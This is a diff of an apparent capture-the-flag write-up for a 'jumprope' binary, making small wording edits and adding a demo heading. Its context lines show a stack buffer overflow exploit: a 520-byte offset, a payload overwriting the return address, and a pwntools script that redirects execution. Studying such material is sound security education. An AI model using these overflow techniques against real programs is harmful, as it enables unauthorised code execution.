@@ -89,7 +89,7 @@ gef➤  pattern offset $rsp
 [+] Found at offset 520 (little-endian search) likely
 ```
 
-in order to exploit this we need
+In order to exploit this we need
 
 
 'A' * 520  +  the address of the function where we want our instruction pointer to point to.
@@ -154,7 +154,7 @@ else:
     p = pwn.process("./jumprope")
 
 
-## cause of the endbr64 (google it ) this didnt work when i tried this localy but i it work on the remote server
+## cause of the endbr64 (google it) this didnt work when i tried this localy but i it work on the remote server
 #new_rip = pwn.p64(0x00000000004011b6)
  
 new_rip = pwn.p64(0x00000000004011bb) # *a+5
@@ -177,6 +177,7 @@ print(p.recv().decode('utf-8'))
 p.interactive()
 ```
 
+## Demo
 
 !['demo'](exploit.gif)
 
